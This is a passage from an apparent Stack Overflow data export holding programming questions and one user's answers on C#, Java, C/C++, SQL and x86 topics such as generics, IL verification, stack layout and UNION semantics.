    record.GetType().GetProperty(property).SetValue(record, valueAsInt, null);
}
else
{
    record.GetType().GetProperty(property).SetValue(record, value, null);
}
</code></pre>

<p>This, however, does not. Unsure why.</p>

<pre><code>Int32.TryParse(value, out valueAsInt) ? record.GetType().GetProperty(property).SetValue(record, valueAsInt, null) :record.GetType().GetProperty(property).SetValue(record, value, null);
</code></pre>

<p>I receive the following error messages:</p>

<p>Error 1 Only assignment, call, increment, decrement, and new object expressions can be used as a statement</p>

<p>Error 2 Type of conditional expression cannot be determined because there is no implicit conversion between 'void' and 'void'</p>

<p>I was just curious as to why the ternary operator fails in this scenario. Thanks!</p>
","33708","","<p>Reflection is red herring here. In C#, not all expressions are valid as independent statements. For instance:</p>

<pre><code>a + b;
</code></pre>

<p>will not compile.</p>

<p>Similarly, <code>? :</code> is not a valid <em>expression-statement</em> construct according to C# grammar. You always have to do something with the value of the ternary expression. If you don't care about the value, you should go with an <code>if</code> statement.</p>

<blockquote>
  <h3><a href=""http://msdn.microsoft.com/en-us/library/aa664812%28v=VS.71%29.aspx"" rel=""nofollow"">Relevant Portion of C# Grammar</a>:</h3>
  
  <p><em>expression-statement</em>:  </p>
  
  <blockquote>
    <p><em>statement-expression</em>   ;  </p>
  </blockquote>
  
  <p><em>statement-expression</em>:  </p>
  
  <blockquote>
    <p><em>invocation-expression</em><br>
    <em>object-creation-expression</em><br>
    <em>assignment</em><br>
    <em>post-increment-expression</em><br>
    <em>post-decrement-expression</em><br>
    <em>pre-increment-expression</em><br>
    <em>pre-decrement-expression</em>  </p>
  </blockquote>
</blockquote>
"
"<p>I have a string like ""abc,,bcd,"";</p>

<p>The output should be abc,bcd i.e. the extra commas should be removed.</p>

<p>Help needed</p>
","33708","","<pre><code>string result = Regex.Replace(input, "",+"", "","").Trim(',');
</code></pre>
"
"<p>for example if have a if else like below , i want to know if this falls under any design patern ,in daily life i come across something like this so many times and don't think its good
to write so many if else blocks</p>

<p>any guidence is really appreciated</p>

<p>sample///</p>

<pre><code> if(dotcom){
  else if (frenc){}
  else if (german){}
  else if (brazil){}
  else if (someothercountry){}
 // and the else if block goes on 
  else {}
  }
</code></pre>
","33708","","<p>In general, it's a code smell to have too many <code>switch</code> statements and <code>if-else if</code> like that. There are two possible solutions:</p>

<ol>
<li><p>You should generally piggyback on virtual method dispatch mechanism offered by your object-oriented language to figure out the code snippet that's going to be executed. You'll need to have a class for each condition, with an <code>abstract</code> base class. In each class you'll override a method that customizes the behavior. </p></li>
<li><p>Use lookup tables (in your specific question, I speculate this to be probably more relevant; this is more useful if you have similar code in all paths but they are going to depend on different values for some variables).</p></li>
</ol>

<p>I believe there are legitimate use cases for such kind of blocks and a large object hierarchy is not always worth it.  It's a code smell, not a hard rule.</p>
"
"<p>In Nerddinner project, i see that dinners has relation to users by username if i didn't understand it wrongly. I expected that dinners would have relation to users by unique identifiers. There is no something wrong about it? If we want to change username of user so we should to consider manually update relations. Please consider old questions which asked why it is not better idea to use username as unique identifiers.</p>
","33708","","<p>I don't have the exact database schema in mind, but as far as I know, user management is handled by ASP.NET built-in membership facilities in the membership database.  While you can get unique ID from ASP.NET membership providers, the type of that identifier can vary across different providers (e.g. could be <code>Int32</code> in one provider and <code>Guid</code> in another as <a href=""http://msdn.microsoft.com/en-us/library/ms152044.aspx"" rel=""nofollow"">providerUserKey</a> argument in membership API is declared of type <code>object</code>). Therefore, if you want to isolate yourself from any specific membership provider, you'd better stick to the username. It's portable.</p>
"
"<p>Here is a simple generic type with a unique generic parameter constrained to reference types:</p>

<pre><code>class A&lt;T&gt; where T : class
{
    public bool F(T r1, T r2)
    {
        return r1 == r2;
    }
}
</code></pre>

<p>The generated <strong>IL</strong> by csc.exe is :</p>

<pre><code>ldarg.1
box        !T
ldarg.2
box        !T
ceq
</code></pre>

<p>So each parameter is <strong>boxed</strong> before proceeding with the comparison.</p>

<p>But if the constraint indicates that ""T"" should never be a value type, <strong>why is the compiler trying to box <code>r1</code> and <code>r2</code></strong> ?</p>
","33708","","<p>It's required to satisfy the verifiability constraints for the generated IL.  Note that <em>unverifiable</em> doesn't necessarily mean <em>incorrect</em>.  It works just fine without the <code>box</code> instruction as long as its security context allows running unverifiable code.  Verification is conservative and is based on a fixed rule set (like <em>reachability</em>).  To simplify things, they chose not to care about presence of generic type constraints in the verification algorithm.</p>

<blockquote>
  <h2><a href=""http://www.ecma-international.org/publications/files/ECMA-ST/ECMA-335.pdf"">Common Language Infrastructure Specification (ECMA-335)</a></h2>
  
  <h3>Section 9.11: Constraints on generic parameters</h3>
  
  <p>...
  Constraints on a generic parameter only restrict the types that the generic parameter
  may be instantiated with. 
  <strong>Verification (see Partition III) requires that a field, property or method that 
  a generic parameter <em>is known to provide through meeting a constraint</em>, cannot 
  be directly accessed/called via the generic parameter <em>unless it is first boxed</em></strong>
  (see Partition III) or the <code>callvirt</code> instruction is prefixed with the <code>constrained</code> prefix instruction. ...</p>
</blockquote>

<p>Removing the <code>box</code> instructions will result in unverifiable code:</p>

<pre><code>.method public hidebysig instance bool 
       F(!T r1,
         !T r2) cil managed
{
   ldarg.1
   ldarg.2
   ceq
   ret
}


c:\Users\Mehrdad\Scratch&gt;peverify sc.dll

Microsoft (R) .NET Framework PE Verifier.  Version  4.0.30319.1
Copyright (c) Microsoft Corporation.  All rights reserved.

[IL]: Error: [c:\Users\Mehrdad\Scratch\sc.dll : A`1[T]::F][offset 0x00000002][fo
und (unboxed) 'T'] Non-compatible types on the stack.
1 Error(s) Verifying sc.dll
</code></pre>

<hr>

<p><strong>UPDATE (Answer to the comment):</strong> As I mentioned above, verifiability is not equivalent to correctness (here I'm talking about ""correctness"" from a type-safety point of view). <em>Verifiable</em> programs are a strict subset of <em>correct</em> programs (i.e. all verifiable programs are demonstrably correct, but there are correct programs that are not verifiable). Thus, verifiability is a stronger property than correctness.  Since C# is a Turing-complete language, <a href=""http://en.wikipedia.org/wiki/Rice%27s_theorem"">Rice's theorem</a> states that proving that programs are correct is undecidable in general case.  </p>

<p>Let's get back to my <em>reachability</em> analogy as it's easier to explain.  Assume you were designing C#. One thing have thought about is when to issue a warning about unreachable code, and to remove that piece of code altogether in the optimizer, but how you are going to detect all unreachable code? Again, Rice's theorem says you can't do that for all programs. For instance:</p>

<pre><code>void Method() {
    while (true) {
    }
    DoSomething();  // unreachable code
}
</code></pre>

<p>This is something that C# compiler actually warns about.  But it doesn't warn about:</p>

<pre><code>bool Condition() {
   return true;
}

void Method() {
   while (Condition()) {
   }
   DoSomething();  // no longer considered unreachable by the C# compiler
}
</code></pre>

<p>A human can prove that control flow never reaches that line in the latter case.  One could argue that the compiler could statically prove <code>DoSomething</code> is unreachable in this case too, but it doesn't. Why?  The point is you can't do that for all programs, so you should draw the line at <em>some point</em>.  At this stage, you have to define a <strong>decidable</strong> property and call it ""reachability"".  For instance, for reachability, C# sticks to constant expressions and won't look at the contents of the functions at all.  Simplicity of analysis and design consistency are important goals in deciding where to draw the line. </p>

<p>Going back to our verifiability concept, it's a similar problem.  Verifiability, unlike correctness, is a decidable property.  As the runtime designer, you have to decide how to define verifiability, based on performance considerations, easy of implementation, ease of specification, consistency, making it easy for the compiler to confidently generate verifiable code.  Like most design decisions, it involves a lot of trade-offs.  Ultimately, the CLI designers have decided that they prefer not too look at generic constraints at all when they are checking for verifiability.</p>
"
"<p>I have a question about Java Generics and Collections.  It's considered good practice to declare a collection like this:</p>

<pre><code>List&lt;String&gt; catNames = new ArrayList&lt;String&gt;();
</code></pre>

<p>because you can change the type of the <code>List</code> and not worry about breaking the rest of your code.  But when I try to do this:</p>

<pre><code>private static Map&lt;IssueType, List&lt;Issue&gt;&gt; orphanedAttrMap = new HashMap&lt;IssueType, ArrayList&lt;Issue&gt;&gt;();
</code></pre>

<p><code>javac</code> complains</p>

<pre><code>Type mismatch: cannot convert from HashMap&lt;ResultsAggregator.IssueType,ArrayList&lt;Issue&gt;&gt; to HashMap&lt;ResultsAggregator.IssueType,List&lt;Issue&gt;&gt;
</code></pre>

<p>Moreover, this is perfectly legal:</p>

<pre><code>private static Map&lt;IssueType, List&lt;Issue&gt;&gt; orphanedAttrMap = new HashMap&lt;IssueType, List&lt;Issue&gt;&gt;();
</code></pre>

<p>which seems even more confusing, because <code>List</code> is an interface, not a concrete class.  What's going on here?  Is this a type erasure issue?</p>
","33708","","<p>If it was legal to compile such a code, you would've been able to sneakily insert element of other types in the <code>HashMap</code>:</p>

<pre><code>HashMap&lt;IssueType, List&lt;Issue&gt;&gt; a = new HashMap&lt;IssueType, ArrayList&lt;Issue&gt;&gt;();
a.put(someIssue, new SomeClassThatImplementsListOfIssueButIsNotArrayList());
</code></pre>

<p>which is not what you expect. <code>ArrayList&lt;String&gt;</code> is a <code>List&lt;String&gt;</code>, but that's not enough for this code to be safe and correct. To be safe, it also requires <code>List&lt;String&gt;</code> to be <code>ArrayList&lt;String&gt;</code>, which means the generic type argument is not covariant here.</p>

<p>Your last code is legal because nothing requires the type parameter to be a concrete class.  Similarly, nothing requires a field to be of an abstract type.</p>
"
"<p>Int[] test = new int[7]</p>

<p>how to change test to a dynamic array?</p>
","33708","","<p>There's no real notion of a stack allocated ""static"" array in C# (ignoring unsafe context and <code>stackalloc</code>). What you just wrote is a dynamic array. It's an object created at runtime on the managed heap. The size can be an expression or variable. For instance:</p>

<pre><code>int[] a = new int[int.Parse(Console.ReadLine())];
</code></pre>

<p>If by dynamic array, you mean an array you can resize easily (like <code>vector</code> in C++), you should use <code>List&lt;T&gt;</code>:</p>

<pre><code>List&lt;int&gt; a = new List&lt;int&gt;();
a.Add(10);
</code></pre>
"
"<p>Why must I provide explicitly generic parameter types While the compiler should infer the type?</p>

<pre><code>public static T2 Cast&lt;T1,T2&gt;(this T1 arg) where T2 : class where T1 : class
{
    return arg as T2;
}
</code></pre>

<p>Sample Usage:</p>

<pre><code> objOfTypeT2 = objOfTypeT1.Cast&lt;TypeT1,TypeT2&gt;();
</code></pre>

<p><br>
Compared to my desired usage with a more intelligent compiler:</p>

<pre><code> objOfTypeT2 = objOfTypeT1.Cast&lt;TypeT2&gt;();
</code></pre>

<p>or maybe I should be more intelligent :-)</p>

<p>Beware that <strong>I provide the return type</strong>. I want to not provide the object that I called the function on it, the method is an <strong>Extension Method</strong>.</p>
","33708","","<p>The specification limits type parameter inference for generic methods to all or nothing. You can't have partial inference.</p>

<p>The rationale is probably simplifying type inference rules (that are already pretty complex, as they have to take into account overloading rules too).</p>
"
"<pre><code>class Program
{
    static delegate R Foo&lt;I, R&gt;(I i);

    static void Main(string[] args)
    {

        Foo&lt;int, string&gt; foo = (int x) =&gt; x.ToString();

        // Why can't the compiler IMPLICITLY infer the following declaration?
        //Foo foo = (int x) =&gt; x.ToString();
    }
}
</code></pre>

<p>EDIT 1: The code above is not compilable actually. The delegate I defined has static modifier that is not applicable!</p>
","33708","","<p>C# spec states that lambdas are <em>untyped</em> constructs (like <em>method groups</em>).  They can be <em>converted</em> to compatible types.  For this reason, you can't write <code>var something = (SomeType a) =&gt; a;</code></p>

<p>The rationale is they can be interpreted as expression trees and delegates depending on the context.  There's no way to know which one is your intent outside a specific context.  You cannot use a lambda expression or method group outside a context in which they can be converted to something.</p>

<blockquote>
  <h3>C# Language Specification v4.0 (Â§1.4.12)</h3>
  
  <h3>Anonymous function conversions and method group conversions</h3>
  
  <p>Anonymous functions and method groups do not have types in and of themselves, but may be implicitly converted to delegate types or expression tree types. Anonymous function conversions are described in more detail in Â§1.44 and method group conversions in Â§1.45.</p>
</blockquote>
"
"<p>i edited the question</p>

<p>it still does not work, the user writes <strong>appendix</strong> then press OK in Login, nothing happens</p>

<p>here is the login (vb.net)</p>

<pre><code>Partial Class login
Inherits System.Web.UI.Page

Protected Sub Button1_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles Button1.Click
    Session(""passcode"") = TextBox1.Text
    Response.Redirect(""Default.aspx"")

End Sub
End Class
</code></pre>

<p>and here is the default page C#</p>

<pre><code>public partial class _Default : System.Web.UI.Page
{
protected void Page_Load(object sender, EventArgs e)
{
    if (Session[""passcode""] == ""appendix"")
    {
       Response.Write(""OK !"");
    }
    else
    {
        Response.Redirect(""login.aspx"");
    }
}


}
</code></pre>
","33708","","<p>You probably mean</p>

<pre><code>Session[""passcode""] == ""Appendix""
</code></pre>

<p>In C# (unlike VB), <code>==</code> is the equality operator and <code>=</code> is the assignment operator.</p>
"
"<p>Normally, JIT Compiler works by reads the byte code, translate it into machine code, and execute it. This is what I understand, but in theory, is it possible to make the JIT Compiler parses the whole program first, then execute the program later as machine code? I do not know how JIT Compiler works technically and exactly, so I don't know any feasibility in this case. But theoretically, is it possible? Or am I doing it wrong?</p>
","33708","","<p>Yes, it's possible, but it's usually not called JIT compilation anymore. It's essentially ahead-of-time (AOT) compilation. </p>
"
"<p>I'm writing some c# that will load a third party assembly.</p>

<p>If the third party decided to be malicious, they could write a recursive function that would end up in a StackOverflowException, bringing down my application.</p>

<p>Is it possible to detect a recursive function? </p>

<p><strong>Update:</strong> 
For undesirable sitations like while(true), or for(;;), I already have a solution. Essentially, I run the third party code in a separate thread, and if the thread takes longer than a fixed duration, I pull the plug. This doesn't work well with recursion since the stack limit is reached extremely quickly.</p>

<p><strong>Update:</strong>
Perhaps I've misrepresented the solution that I'm after. If I end up getting a lot of intentionally malicious code, I'll change the application to run the third party code in a separate process. However at this stage, I'm assuming that the code will only cause problems because it's poorly written.</p>

<p><strong>Accepted Answer</strong>
I've decided that the best approach would be to run the third party libraries in a separate process. I can have multiple instances of the processes running, and even do a sort of load balancing of my third party libraries across the processes. If malicious code is executed that kills one of the processes, I should be able to detect which library killed it, mark that library as malicious, and relaunch the process with all of the non-malicious libraries. </p>

<p>Thanks for everyone's great suggestions!</p>
","33708","","<p>It's not easy to do that in the general case.  Besides, recursion is a useful tool for programming and it's not a good idea to ban that completely.</p>

<p>A better idea is to run the assembly in another process and use an interprocess communication mechanism to call methods from the trusted process.</p>
"
"<p>I want to write a <em>for</em> loop as shown below; in the initialization section, I want to declare variables of different types:</p>

<pre><code>    for (int loop=0, long result = 1; loop &lt;= 10 ; loop++, result *= 2 )
    {
        cout &lt;&lt; ""2^""&lt;&lt;loop&lt;&lt;""="" &lt;&lt; result&lt;&lt;endl;
    }
</code></pre>

<p>But it is giving error, means it's not allowed. Any solution for that?</p>
","33708","","<p>You can declare multiple variables in a for loop declaration part as long as they are of a single base type (i.e. you can declare an <code>int</code> and an <code>int*</code> in a single declaration, but not an <code>int</code> and a <code>long</code>).  </p>
"
"<p>I have a string of 9 space-separated integers, like <code>""3 4 6 9 8 8 2 3 4""</code>, which I want to convert to a 3x3 int Array. </p>

<p>A simple solution is to do two loops over a new matrix and convert string values 
as I go. Is there a more elegant way to do this?</p>
","33708","","<p>Basically, your solution is as good as you can go.  You can accomplish the same thing with LINQ:</p>

<pre><code>int[][] result = 
    s.Split(' ')
     .Select((a, index) =&gt; new {index, value = int.Parse(a)})
     .GroupBy(tuple =&gt; tuple.index / 3)
     .Select(g =&gt; g.Select(tuple =&gt; tuple.value).ToArray())
     .ToArray();
</code></pre>

<p>For this problem, the LINQ solution is probably worse than the normal solution; however, the idea may be helpful for similar problems.</p>
"
"<p>Is there a way of doing this:</p>

<pre><code>protected void SubscribeToEvent&lt;TEvent, TPayload&gt;(Action&lt;TPayload&gt; a_action)
    where TEvent : CompositePresentationEvent&lt;TPayload&gt;
{
    TEvent newEvent = _eventAggregator.GetEvent&lt;TEvent&gt;();
    SubscriptionToken eventToken = newEvent.Subscribe(a_action);

    _lstEventSubscriptions.Add(new KeyValuePair&lt;EventBase, SubscriptionToken&gt;(newEvent, eventToken));
}
</code></pre>

<p>without requiring the user to specify a <code>TPayload</code> parameter?</p>
","33708","","<p>No, there isn't. Not in C# 4. You can't do that with a single method.</p>

<p><code>TEvent</code> cannot be inferred from the arguments passed to the method, and since partial inference is not available for generic type arguments, you'll have to manually specify the type argument at call site.</p>
"
"<p>Objective-C and C++ belong to the C family, so in terms of ""static"", there are static variables, static functions, static classes etc. </p>

<p>Static has static storage, lifecycle, scope. </p>

<p>Here is the question: </p>

<ul>
<li>What are the big differences in the meaning of ""static"" in C++ and Objective C?</li>
</ul>
","33708","","<p><code>static</code> in Objective-C is identical to its plain C counterpart (specifying the variable linkage). While C++ supports this usage of <code>static</code>, it extends the meaning of the <code>static</code> keyword to declaring class methods as well.</p>
"
"<p>Read in text books that stack grows by decreasing memory address, that is from higher address to lower address. May be a bad question, but i didnt get the concept right.</p>
","33708","","<p>First, it's platform dependent.  In some architectures, stack is allocated from the bottom of the address space and grows upwards.</p>

<p>Assuming an architecture like x86 that stack grown downwards from the top of address space, the idea is pretty simple:</p>

<pre><code>===============     Highest Address (e.g. 0xFFFF)
|             |
|    STACK    |
|             |
|-------------|  &lt;- Stack Pointer   (e.g. 0xEEEE)
|             |
.     ...     .
|             |
|-------------|  &lt;- Heap Pointer    (e.g. 0x2222)
|             |
|    HEAP     |
|             |
===============     Lowest Address  (e.g. 0x0000)
</code></pre>

<p>To grow stack, you'd decrease the stack pointer:</p>

<pre><code>===============     Highest Address (e.g. 0xFFFF)
|             |
|    STACK    |
|             |
|.............|  &lt;- Old Stack Pointer (e.g. 0xEEEE)
|             |
| Newly       |
| allocated   |
|-------------|  &lt;- New Stack Pointer (e.g. 0xAAAA)
.     ...     .
|             |
|-------------|  &lt;- Heap Pointer      (e.g. 0x2222)
|             |
|    HEAP     |
|             |
===============     Lowest Address    (e.g. 0x0000)
</code></pre>

<p>As you can see, to grow stack, we have <em>decreased</em> the stack pointer from 0xEEEE to 0xAAAA, whereas to grow heap, you have to increase the heap pointer. </p>

<p><em>Obviously, this is a simplification of memory layout. The actual executable, data section, ... is also loaded in memory. Besides, threads have their own stack space.</em></p>

<p>You may ask, why should stack grow downwards. Well, as I said before, some architectures do the reverse, making heap grow downwards and stack grow upwards.  It makes sense to put stack and heap on opposite sides as it prevents overlap and allows both areas to grow freely as long as you have enough address space available.</p>

<p>Another valid question could be: Isn't the program supposed to decrease/increase the stack pointer itself? How can an architecture impose one over the other to the programmer? Why it's not so program dependent as it's architecture dependent? 
While you can pretty much fight the architecture and somehow get away your stack in the opposite direction, some instructions, notably <code>call</code> and <code>ret</code> that modify the stack pointer directly are going to assume another direction, making a mess.</p>
"
"<p>In c++, for vector,
    why preallocation is so important even if vector alocates space dynamically</p>
","33708","","<p>First, it's unlikely to be ""so important"" for 99% of cases.</p>

<p>It's basically an optimization.  Since vector doesn't have any idea how many elements you are going to add to it, it assumes a small default, and will have to grow if you try to add a new element and there is not enough space for a new element to be added.
The grow operation can be costly as it may require allocating an entirely new buffer, copying the current contents of the vector to the new buffer, and deallocating the old buffer. By preallocating enough space, if you know how many elements you are going to add, you can avoid unnecessary growth. </p>

<p>Like any performance optimization, you shouldn't worry about it unless it's a bottleneck. Moreover, if you have no idea how many elements you're going to add, let the vector decide. Don't assume your randomly chosen number is going to work better than the implementation default.</p>
"
"<p>Say I've got a database with about 5,000 blog posts from the last 2 years, I'm trying to create 'monthly' archives so I can display the data in a much more logical way.</p>

<p>For some reason I've never really had to work with date's all that much and my knowledge is lacking.</p>

<p>I'm using Linq/C#; can someone point me in the right direction to learn how to do this?</p>

<p>Cheers</p>

<p>Matt</p>
","33708","","<p>Well, it's not much different from filtering based on an integer property:</p>

<pre><code>DateTime beginDate, endDate;
// set beginDate and endDate as appropriate, based on the month you are displaying
// beginDate = new DateTime(2011, 1, 1);
// endDate = beginDate.AddMonths(1);
var query = from post in db.Entries
            where post.Date &gt;= beginDate &amp;&amp; post.Date &lt; endDate
            orderby post.Date descending
            select post;
</code></pre>
"
"<p>I was looking at the different instructions in assembly and I am confused on how the lengths of different operands and opcodes are decided upon.</p>

<p>Is it something you <em>ought</em> to know from experience, or is there a way to find out which operand/operator combination takes up how many bytes?</p>

<p>For eg:</p>

<blockquote>
  <p>push %ebp ; takes up one byte</p>
  
  <p>mov %esp, %ebp ; takes up two bytes</p>
</blockquote>

<p>So the question is:-</p>

<blockquote>
  <p>Upon seeing a given instruction, how can I deduce how many bytes its opcode will require?</p>
</blockquote>
","33708","","<p>There's no hard and fast rule for x86 without a database as the instruction encoding is pretty complex (and the opcode itself can vary from 1 to 3 bytes).  You can consult the <a href=""http://www.intel.com/Assets/PDF/manual/253666.pdf"" rel=""nofollow"">IntelÂ® 64 and IA-32 Architectures Software Developerâs Manual 2A</a> document (Chapter 2: Instruction Format) to see how instructions and their operands are encoded:</p>

<p><img src=""http://img819.imageshack.us/img819/8206/intelinstructionlength.png"" alt=""Intel 64 Software Developer's Manual 2A - Figure 2-1""></p>
"
"<p>I've got an <code>IEnumerable&lt;T&gt;</code>, and I need a copy of it. Anything that implements <code>IEnumerable&lt;T&gt;</code> will do just fine. What's the cheapest way to copy it? <code>.ToArray()</code> maybe?</p>
","33708","","<p><code>ToArray</code> is not necessarily faster than <code>ToList</code>. Just use <code>ToList</code>.</p>

<p>The point is as long as you don't know the number of elements of the original sequence before enumerating, you end up with resizing an array and adding elements to it like a <code>List&lt;T&gt;</code> does, so <code>ToArray</code> will have to do the same thing a <code>List&lt;T&gt;</code> does anyway. Besides, <code>ToList</code> gives you a <code>List&lt;T&gt;</code> and that's nicer than a raw array.</p>

<p>Of course, if you know the concrete type of the <code>IEnumerable&lt;T&gt;</code> instance, there can be faster methods, but that's not germane to the point. </p>

<p><em>Side note: using an array (unless you have to) is arguably a micro-optimization and should be <a href=""http://blogs.msdn.com/b/ericlippert/archive/2008/09/22/arrays-considered-somewhat-harmful.aspx"">avoided</a> <a href=""http://stackoverflow.com/questions/434761/array-versus-listt-when-to-use-which/434765#434765"">most of the time</a>.</em></p>
"
"<p>How can I restart a <code>foreach</code> loop in C#??</p>

<p>For example:</p>

<pre><code>Action a;
foreach(Constrain c in Constrains)
{
   if(!c.Allows(a))
   {
      a.Change();
      restart;
   }
}
</code></pre>

<p><code>restart</code> here is like <code>continue</code> or <code>break</code> but it restarts the foreach from the begining
It is like setting the counter of a <code>for</code> loop to 0 again..</p>

<p>Is that possible in C#?</p>

<p>Edit:I want to thank both Mehrdad Afshari and Mahesh Velaga for letting me discover a bug (index=0) in my current implementation, that would not have been discovered otherwise..</p>
","33708","","<p>Use the good old <code>goto</code>:</p>

<pre><code>restart:
foreach(Constrain c in Constrains)
{
   if(!c.Allows(a))
   {
      a.Change();
      goto restart;
   }
}
</code></pre>

<p>If you're diagnosed with gotophobia 100% of the time for some reason (which is <em>not</em> a good thing without a reason), you can try using a flag instead:</p>

<pre><code>bool restart;
do {
   restart = false;
   foreach(Constrain c in Constrains)
   {
      if(!c.Allows(a))
      {
         a.Change();
         restart = true;
         break;
      }
   }
} while (restart);
</code></pre>
"
"<p>This is actually fairly tricky to Google.</p>

<p>How do you SET (bitwise or) the top two bits of a 32 bit int?</p>

<p>I am getting compiler warnings from everything I try.</p>
","33708","","<p>Try this:</p>

<pre><code>integerVariable |= 3 &lt;&lt; 30; 
</code></pre>

<p>It may be more clear to use (1 &lt;&lt; 31) | (1 &lt;&lt; 30) instead of (3 &lt;&lt; 30), or you could add a comment about the behavior. In any case, the compiler should be able to optimize the expression to a single value, which is equal to <code>int.MinValue &gt;&gt; 1</code> == <code>int.MinValue / 2</code>.</p>

<hr>

<p>If it's a <code>uint</code>:</p>

<pre><code>uintVar |= 3u &lt;&lt; 30;
</code></pre>
"
"<p>How do I write a timezone converter library in c#? or is there an existing timezone class I could use?</p>

<p>I will need the timezone database and be able to use it to calculate/convert from one UTC timezone to another timezone.</p>
","33708","","<p>Try <a href=""http://code.google.com/p/noda-time/"" rel=""nofollow"">Noda Time</a>.</p>
"
"<p>I'm having trouble understanding what happens when a ToArray() is called on an IEnumerable. I've always assumed that only the references are copied.</p>

<p>I would expect the output here to be:
true
true</p>

<p>But instead I get
true
false</p>

<p>What is going on here?</p>

<pre><code>class One {
    public bool Foo { get; set; }
}

class Two
{
    public bool Foo { get; set; }
}

void Main()
{
    var collection1 = new[] { new One(), new One() };

    IEnumerable&lt;Two&gt; stuff = Convert(collection1);

    var firstOne = stuff.First();

    firstOne.Foo = true;

    Console.WriteLine (firstOne.Foo);

    var array = stuff.ToArray();

    Console.WriteLine (array[0].Foo);
}

IEnumerable&lt;Two&gt; Convert(IEnumerable&lt;One&gt; col1) {

    return
        from c in col1
        select new Two() {
            Foo = c.Foo
        };
}
</code></pre>
","33708","","<p><code>.ToArray()</code> is red herring here. In your <code>Convert</code> function, you are creating an entirely unrelated instance of <code>Two</code> and setting its property to a <em>boolean value</em> (which is <em>not</em> a reference type) you take from the <code>One</code> instance.  Any changes to the newly created instance of <code>Two</code> will <strong>not</strong> affect the <code>One</code> instance.  They are not related in any ways.</p>

<p>If your <code>Convert</code> did this:</p>

<pre><code>IEnumerable&lt;One&gt; Convert(IEnumerable&lt;One&gt; input) {
   return from i in input
          select i;
}
</code></pre>

<p>you'd get the result you expected.</p>
"
"<p>In C, from what I understand, primitives like ints and floats are initialized to 0 when they are first declared. The same is true if a struct is declared that contains primitives. I'm having trouble finding a simple way to check if primitives are uninitialized or not.</p>

<p>For example, let's say I have an instance variable that is of type int declared in a header file. I need to use this variable in my implementation code, and it is important for me to know if this value has been initialized or not. Checking against zero isn't really an option, because if that value really is supposed to be zero then I've reinitialized a value that has already been changed. Checking against NULL also won't work, because it isn't a pointer.</p>

<p>The only solution that I've come up with is initializing the variable in the first piece of executable code to some value that I know will never be relevant to the rest of the program. For example, if the value should never be below zero, then I initialize it to -1 to know that it hasn't been initialized yet. This seems really crufty though, and can cause problems if the range of values to which the variable can be assigned changes.</p>

<p>Any interesting suggestions to this kind of problem? Thanks in advance!</p>
","33708","","<p>Your understanding is incorrect. Local variables are uninitialized regardless of being <code>int</code> or <code>float</code>.</p>

<p>Only <code>static</code> variables are initialized to zero. You should initialize everything before use. Even if you feel your implementation initializes the variable, you shouldn't rely on that. The standard doesn't guarantee anything. Using an uninitialized variable is an undefined behavior.</p>
"
"<p>If I instantiate an object like such :</p>

<pre><code>Person hello = new Person();
</code></pre>

<p>I'm allowed to do something like </p>

<pre><code>Employee test = (Employee)hello;
</code></pre>

<p>What does this do? What'd downcasting all about? So when we allocate memory for the base, and down cast what happens there?</p>
","33708","","<p>It will not work.  It will throw <code>InvalidCastException</code> at runtime. (assuming <code>Employee : Person</code>).</p>
"
"<p>This is considered upcasting correct?</p>

<pre><code>Derived d = new Derived();
Base b = d; // Always OK.
</code></pre>

<p>Why would someone upcast? When? Is it because we must turn the object into the base class so it does not have the functionality of the derived class?</p>

<p>How does this code look in memory? Derived class instantiates and memory is created for that object. Then a base class object is made that references <code>d</code> now.</p>
","33708","","<blockquote>
  <p>Is it cause we must turn the object into the base class so it does not have the functionality of the derived class?</p>
</blockquote>

<p>Because there's some piece of code that works whether or not your object is <code>Derived1</code> or <code>Derived2</code> and is written only based on the assumption that it supports <code>Base</code> functionality.  This is called <em>abstraction</em> and will result in code reuse. You don't have to rewrite that function for <code>Derived1</code> and <code>Derived2</code> separately. You abstract away the details specific to <code>Derived1</code> and <code>Derived2</code>.</p>

<p>By the way, many times, you don't do the cast explicitly. You simply take advantage of this fact when you pass an instance to a function. For instance, when you add a <code>string</code> to an <code>ArrayList</code>, you implicitly cast it to its base type <code>object</code> because the signature for <code>Add</code> is:</p>

<pre><code>void Add(object o);
</code></pre>
"
"<p>Taking the following statement:</p>

<pre><code>select count( 1 ) as cnt from tbl where val= 1 
union
select count( 1 ) as cnt from tbl where val = 0
</code></pre>

<p>If the two selects return the same value the result is a single row with that value. If the selects return different values the result is two rows with the two values. Why?</p>

<p>I am trying to find the total count of rows using:</p>

<pre><code>select sum (cnt) from
(
    select count( 1 ) as cnt from tbl where value = 1
    union
    select count( 1 ) as cnt from tbl where value = 0
) as tbl2
</code></pre>

<p>which works as expected if the counts are different but gives half the value if the counts are the same... </p>

<p>(PS : More interested in why sql behaves this way than in a solution)</p>
","33708","","<p>This behavior is by design. You should use <code>UNION ALL</code> to achieve the behavior you want. Basically, <code>UNION</code> performs a set union operation, removing the duplicates in the set.</p>

<p><a href=""http://www.fmsinc.com/free/NewTips/SQL/SQLtip5.asp"" rel=""nofollow"">http://www.fmsinc.com/free/NewTips/SQL/SQLtip5.asp</a></p>
"
"<p>I'm developing a Java application that has performance at its core. 
I have a list of some 40,000 ""final"" objects,
i.e., I have an initialization input data of 40,000 vectors. 
This data is unchanged throughout the program's run.</p>

<p>I am always preforming lookups against a single ID property to retrieve the proper vectors. 
Currently I am using a <code>HashMap</code> over a sub-sample of a 1,000 vectors,
but
I'm not sure it will scale to production.   </p>

<p>When is BIG, actually big enough for a use of DB?
One more thing, an SQLite DB is a viable option as no concurrency is involved,
so I guess the ""threshold"" for db use, is perhaps lower.</p>
","33708","","<p>As long as you're loading the data set in a memory at the beginning of the program and keeping it in memory and you don't have any complex queries, some sort of serialization/deserialization seems to be more feasible than a full blown database.</p>
"
"<p>I am trying to remove a last character of a string. This last char. is a newline (system.environment.newline)</p>

<p>I have tried some things but I can not remove it.</p>

<p>Example:</p>

<pre><code>myString.Remove(sFP.Length - 1)
</code></pre>

<p>Example 2:</p>

<pre><code>myString= Replace(myString, Environment.NewLine, """", myString.Length - 1)
</code></pre>

<p>How I can do it?</p>

<p>Thanks in advance.</p>
","33708","","<p>If your newline is CR LF, it's actually two consecutive characters.  Try your <code>Remove</code> call with <code>Length - 2</code>.</p>

<p>If you want to remove all ""\n"" and ""\r"" characters at the end of string, try calling <code>TrimEnd</code>, passing the characters:</p>

<pre><code>str.TrimEnd(vbCr, vbLf)
</code></pre>

<p>To remove all the whitespace characters (newlines, tabs, spaces, ...) just call <code>TrimEnd</code> without passing anything.</p>
"
"<p>I looked at some Java code today, and I found some weird syntax:</p>

